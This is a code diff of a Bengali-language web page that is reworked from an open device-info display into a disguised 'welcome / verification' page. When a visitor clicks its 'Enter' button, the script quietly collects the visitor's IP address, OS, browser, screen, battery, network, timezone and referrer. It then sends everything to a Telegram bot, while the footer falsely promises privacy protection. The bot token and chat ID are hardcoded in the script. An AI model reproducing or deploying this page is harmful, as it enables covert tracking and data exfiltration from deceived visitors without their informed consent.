@@ -2,126 +2,137 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ডিটেইলড ভিজিটর ইনফো - টেলিগ্রাম ট্র্যাকার</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>ভিজিটর ট্র্যাকার - লোডিং ওয়েটিং</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #0a0f1c 0%, #141c2c 100%);
-            padding: 30px 20px;
             min-height: 100vh;
+            background: linear-gradient(145deg, #0b1120 0%, #19233c 100%);
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
 
         .card {
-            max-width: 1100px;
+            max-width: 480px;
             width: 100%;
-            background: rgba(18, 28, 40, 0.85);
-            backdrop-filter: blur(14px);
+            background: rgba(20, 30, 45, 0.85);
+            backdrop-filter: blur(16px);
             border-radius: 2rem;
-            border: 1px solid rgba(255, 215, 150, 0.25);
-            padding: 1.8rem;
-            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
-        }
-
-        h1 {
-            color: #ffdfa5;
-            font-size: 1.6rem;
-            border-left: 5px solid #ffae42;
-            padding-left: 20px;
-            margin-bottom: 25px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .badge {
-            background: #1f3a4b;
-            font-size: 0.7rem;
-            padding: 4px 12px;
-            border-radius: 40px;
-            color: #bbd4ff;
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
-            gap: 16px;
-            margin-bottom: 20px;
-        }
-
-        .info-item {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 1.2rem;
-            padding: 14px 18px;
-            border-left: 3px solid #ffa559;
-            transition: 0.1s;
-        }
-
-        .info-label {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #9eb4dc;
-        }
-
-        .info-value {
-            font-size: 1rem;
-            font-weight: 500;
-            color: #f5f9ff;
-            word-break: break-word;
-            margin-top: 5px;
-        }
-
-        .footer-note {
-            margin-top: 25px;
+            border: 1px solid rgba(255, 215, 150, 0.3);
+            padding: 2rem 1.8rem;
             text-align: center;
-            font-size: 0.75rem;
-            color: #7e8dab;
-            border-top: 1px solid rgba(255,255,200,0.15);
-            padding-top: 16px;
+            box-shadow: 0 25px 40px rgba(0,0,0,0.5);
+            transition: 0.2s;
         }
 
-        .status-dot {
+        .icon {
+            font-size: 3.2rem;
+            margin-bottom: 1rem;
+        }
+
+        h2 {
+            color: #ffe0b5;
+            font-size: 1.7rem;
+            margin-bottom: 12px;
+        }
+
+        .desc {
+            color: #b9ceff;
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+
+        .enter-btn {
+            background: linear-gradient(95deg, #2a6f3c, #1f8a3e);
+            border: none;
+            color: white;
+            font-size: 1.25rem;
+            font-weight: bold;
+            padding: 12px 32px;
+            border-radius: 60px;
+            cursor: pointer;
+            width: 80%;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.3);
+            transition: transform 0.1s, background 0.2s;
+        }
+
+        .enter-btn:active {
+            transform: scale(0.97);
+        }
+
+        .loading-area {
+            margin-top: 28px;
+            min-height: 70px;
+        }
+
+        .loading-spinner {
             display: inline-block;
-            width: 10px;
-            height: 10px;
-            background-color: #2ad47e;
+            width: 28px;
+            height: 28px;
+            border: 3px solid rgba(255,215,150,0.3);
             border-radius: 50%;
-            margin-right: 8px;
-            box-shadow: 0 0 5px #2ad47e;
+            border-top-color: #ffbc6e;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loading-text {
+            color: #ffd58c;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-msg {
+            color: #a3e0a3;
+            font-size: 0.85rem;
+            background: #1e3a2a80;
+            padding: 8px 12px;
+            border-radius: 40px;
+            display: inline-block;
+        }
+
+        footer {
+            margin-top: 28px;
+            font-size: 0.65rem;
+            color: #6a7c9e;
         }
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>
-        📡 লাইভ ডিভাইস তথ্য 
-        <span class="badge">টেলিগ্রাম রিপোর্ট সক্রিয়</span>
-    </h1>
-    <div class="info-grid" id="deviceInfoGrid">
-        <!-- dynamic data will be inserted here -->
+    <div class="icon">🔐</div>
+    <h2>স্বাগতম</h2>
+    <div class="desc">
+        আপনার ডিভাইসের তথ্য সংগ্রহ করে যাচাই করা হবে<br>
+        নিচের বাটনে ক্লিক করুন
     </div>
-    <div class="footer-note">
-        <span class="status-dot"></span> আপনার সব তথ্য সংগ্রহ করে টেলিগ্রামে পাঠানো হয়েছে (একবার)
-    </div>
+    <button id="actionBtn" class="enter-btn">✅ প্রবেশ করুন</button>
+    <div id="loadingContainer" class="loading-area"></div>
+    <footer>🔒 নিরাপদ সংযোগ • তথ্য গোপনীয়তা সুরক্ষিত</footer>
 </div>
 
 <script>
     (function() {
-        // ================== টেলিগ্রাম বট কনফিগ ==================
+        // ================== টেলিগ্রাম বট কনফিগ (আগের মত) ==================
         const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
         const DEFAULT_CHAT_ID = "7709670231";
+        let isTracking = false;   // prevent double click during tracking
 
-        // ----- ইউটিলিটি ফাংশন -----
+        // ----- ডাটা কালেকশন ফাংশন (সব ডিটেইল, শুধু টেলিগ্রামের জন্য) -----
         async function getPublicIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -176,8 +187,7 @@
             return { os, browser };
         }
 
-        // ----- সব তথ্য সংগ্রহ ও UI দেখানো -----
-        async function collectAndDisplay() {
+        async function collectVisitorData() {
             const ip = await getPublicIP();
             const battery = await getBatteryInfo();
             const network = getNetworkInfo();
@@ -190,37 +200,8 @@
             const pageUrl = window.location.href;
             const referrer = document.referrer || "সরাসরি";
 
-            const infoArray = [
-                { label: "🌐 আইপি অ্যাড্রেস", value: ip },
-                { label: "📱 অপারেটিং সিস্টেম", value: osBrowser.os },
-                { label: "🌍 ব্রাউজার", value: osBrowser.browser },
-                { label: "📺 স্ক্রিন রেজুলেশন", value: screenDet.resolution },
-                { label: "🎨 কালার ডেপথ", value: screenDet.colorDepth },
-                { label: "🔋 ব্যাটারি লেভেল", value: battery.level },
-                { label: "⚡ চার্জিং স্ট্যাটাস", value: battery.charging },
-                { label: "📡 নেটওয়ার্ক টাইপ", value: network.type },
-                { label: "⏱️ RTT (লেটেন্সি)", value: network.rtt },
-                { label: "⚡ আনুমানিক স্পিড", value: network.speed },
-                { label: "🗣️ ভাষা (Language)", value: language },
-                { label: "🕒 টাইমজোন", value: timezone },
-                { label: "🕙 স্থানীয় সময়", value: localTime },
-                { label: "🍪 কুকি সাপোর্ট", value: cookieEnabled },
-                { label: "🔗 পৃষ্ঠার ইউআরএল", value: pageUrl },
-                { label: "🔙 রেফারার", value: referrer }
-            ];
-
-            const grid = document.getElementById('deviceInfoGrid');
-            grid.innerHTML = "";
-            for (let item of infoArray) {
-                const div = document.createElement('div');
-                div.className = "info-item";
-                div.innerHTML = `<div class="info-label">${item.label}</div><div class="info-value">${item.value}</div>`;
-                grid.appendChild(div);
-            }
-
-            // টেলিগ্রামের জন্য মেসেজ তৈরি
-            const message = `📢 বিস্তারিত ভিজিট তথ্য:\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেটওয়ার্ক: ${network.type}, RTT ${network.rtt}, স্পীড ${network.speed}\nস্থানীয় সময়: ${localTime}\nপেজ ইউআরএল: ${pageUrl}\nরেফারার: ${referrer}`;
-            sendToTelegram(message);
+            const message = `📢 নিউ ভিজিট (ক্লিক করা হয়েছে)\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nকালার ডেপথ: ${screenDet.colorDepth}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেটওয়ার্ক: ${network.type}\nRTT: ${network.rtt}\nস্পিড: ${network.speed}\nভাষা: ${language}\nটাইমজোন: ${timezone}\nস্থানীয় সময়: ${localTime}\nকুকি: ${cookieEnabled}\nপেজ ইউআরএল: ${pageUrl}\nরেফারার: ${referrer}`;
+            return message;
         }
 
         async function sendToTelegram(text) {
@@ -228,34 +209,77 @@
                 const params = new URLSearchParams();
                 params.append('chat_id', DEFAULT_CHAT_ID);
                 params.append('text', text);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: params
                 });
-                console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
+                const result = await response.json();
+                if (result.ok) {
+                    console.log("✅ টেলিগ্রামে সফলভাবে পাঠানো হয়েছে");
+                    return true;
+                } else {
+                    console.warn("Telegram error:", result.description);
+                    return false;
+                }
             } catch(e) {
-                console.warn("❌ টেলিগ্রাম পাঠাতে ব্যর্থ:", e);
+                console.warn("নেটওয়ার্ক বা টেলিগ্রাম সমস্যা:", e);
+                return false;
             }
         }
 
-        // স্থানীয় সময় প্রতি সেকেন্ড আপডেট (শুধু UI তে)
-        function startTimeUpdater() {
-            setInterval(() => {
-                const localTimeNow = new Date().toLocaleString('bn-BD', { hour12: false });
-                const timeElements = document.querySelectorAll('.info-item');
-                for (let el of timeElements) {
-                    if (el.innerText.includes("স্থানীয় সময়")) {
-                        const valueSpan = el.querySelector('.info-value');
-                        if (valueSpan) valueSpan.innerText = localTimeNow;
-                        break;
-                    }
-                }
-            }, 1000);
+        // UI element references
+        const btn = document.getElementById('actionBtn');
+        const loadingContainer = document.getElementById('loadingContainer');
+
+        function showLoading() {
+            loadingContainer.innerHTML = `
+                <div class="loading-spinner"></div>
+                <div class="loading-text">তথ্য সংগ্রহ ও যাচাই করা হচ্ছে... দয়া করে অপেক্ষা করুন</div>
+            `;
         }
 
-        // সব শুরু
-        collectAndDisplay().then(() => startTimeUpdater());
+        function showSuccess() {
+            loadingContainer.innerHTML = `<div class="success-msg">✔ সম্পন্ন! তথ্য গ্রহণ করা হয়েছে। ধন্যবাদ।</div>`;
+            // optional: hide after 3 seconds?
+            setTimeout(() => {
+                if (loadingContainer.innerHTML.includes("সম্পন্ন")) {
+                    loadingContainer.innerHTML = `<div class="loading-text" style="color:#98b2d4;">✅ আগের তথ্য রেকর্ড করা হয়েছে</div>`;
+                }
+            }, 3500);
+        }
+
+        function showError() {
+            loadingContainer.innerHTML = `<div class="loading-text" style="color:#ffaa88;">⚠️ প্রেরণে সমস্যা, তবে তথ্য সংগৃহীত হয়েছে।</div>`;
+        }
+
+        async function handleClick() {
+            if (isTracking) return; // already processing
+            isTracking = true;
+            btn.disabled = true;
+            btn.style.opacity = "0.7";
+            showLoading();
+
+            try {
+                const messageText = await collectVisitorData();
+                const sent = await sendToTelegram(messageText);
+                if (sent) {
+                    showSuccess();
+                } else {
+                    showError();
+                }
+            } catch (err) {
+                console.error(err);
+                showError();
+            } finally {
+                isTracking = false;
+                btn.disabled = false;
+                btn.style.opacity = "1";
+            }
+        }
+
+        // Attach event
+        btn.addEventListener('click', handleClick);
     })();
 </script>
 </body>
